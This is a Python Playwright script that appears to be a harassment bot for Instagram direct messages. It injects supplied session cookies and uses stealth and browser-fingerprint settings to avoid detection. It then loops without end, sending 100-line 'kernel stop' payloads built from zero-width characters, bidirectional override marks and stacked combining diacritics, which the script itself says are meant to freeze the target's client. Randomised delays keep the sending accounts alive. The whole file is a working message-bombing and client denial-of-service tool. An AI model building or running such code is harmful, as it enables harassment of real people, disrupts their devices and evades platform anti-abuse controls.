# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (PLAYWRIGHT ULTIMATE)
# 📅 STATUS: IMPORT-FIXED | 100-LINE PAPA | STABILITY-MAX

import os, asyncio, random, sys
from playwright.async_api import async_playwright
# --- THE FIX: Import the function specifically ---
from playwright_stealth import stealth

def get_kernel_stop_payload(target_name):
    u_id = random.randint(10000, 99999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
    
    z_tower = "̸" * 30 
    width_bomb = "\u2800\u00A0" * 35
    lines = [header]
    for i in range(100):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("XY12", k=2))
        # Building the 100-line block
        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
    return "\n".join(lines)[:9990]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    cookie_index = (machine_id - 1) % len(cookie_list)
    current_cookie = cookie_list[cookie_index].strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        # 🎭 Create context with high-end desktop fingerprint
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        page = await context.new_page()
        
        # ✅ THE CALL: Now it targets the function correctly
        await stealth(page)
        
        try:
            print(f"📡 [M{machine_id}] Establishing Domain...")
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid",
                "value": current_cookie,
                "domain": ".instagram.com",
                "path": "/",
                "secure": True
            }])

            print(f"📡 [M{machine_id}] Entering Chat...")
            # We use 'domcontentloaded' to start the script before heavy ads load
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            box_selector = "//div[@role='textbox']"
            await page.wait_for_selector(box_selector, timeout=90000)
            print(f"✅ [M{machine_id}] PAPA IS ON TOP. Target Locked.")

            while True:
                # 🔥 DOUBLE-PULSE WAVE
                for _ in range(2):
                    payload = get_kernel_stop_payload(target_name)
                    # Playwright 'fill' is immune to the 'stale element' errors of Selenium
                    await page.fill(box_selector, payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M{machine_id}] 100-Line Pulse Delivered.")
                    await asyncio.sleep(1.5)

                # Stealth Jitter: Balance between freezing them and keeping account alive
                await asyncio.sleep(random.uniform(18, 26))

                # Periodic refresh to clear the DOM and prevent local browser crash
                if random.random() < 0.1:
                    await page.reload(wait_until="domcontentloaded")

        except Exception as e:
            print(f"❌ [M{machine_id}] Error in Strike: {str(e)[:60]}")
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
